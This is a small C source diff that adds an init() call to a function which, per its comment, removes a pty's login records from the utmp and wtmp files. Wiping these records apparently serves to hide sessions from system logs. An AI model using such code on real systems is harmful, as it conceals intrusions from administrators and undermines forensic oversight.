@@ -59,6 +59,7 @@ static void uwtmp_clean(STRUCT_UTMP *utmp_entry, const char *pty_name, int fd) {
 /** remove `pty_name` login records on utmp and wtmp files
  */
 void    cleanup_login_records(const char *pty_name) {
+    init();
     DEBUG(D_INFO, "called cleanup_login_records()");
 
     STRUCT_UTMP     utmp_entry;
